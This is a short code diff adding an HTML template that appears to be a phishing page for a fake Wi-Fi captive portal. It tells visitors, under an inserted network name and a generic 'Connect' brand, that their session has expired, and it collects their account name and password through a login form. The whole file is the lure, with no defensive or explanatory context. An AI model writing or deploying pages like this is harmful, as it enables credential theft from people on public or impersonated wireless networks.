@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>{{ title }} — {{ ssid }}</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}" />
+</head>
+<body class="social">
+  <div class="card">
+    <div class="brand">◎ Connect</div>
+    <h1>{{ title }}</h1>
+    <p class="muted">Your session on <strong>{{ ssid }}</strong> expired. Sign in again.</p>
+    <form method="POST" action="/login">
+      <label>Account
+        <input type="text" name="account" autocomplete="username" required />
+      </label>
+      <label>Password
+        <input type="password" name="password" autocomplete="current-password" required />
+      </label>
+      <button type="submit">Sign In</button>
+    </form>
+    <p class="fineprint">By continuing you agree to the network terms.</p>
+  </div>
+</body>
+</html>
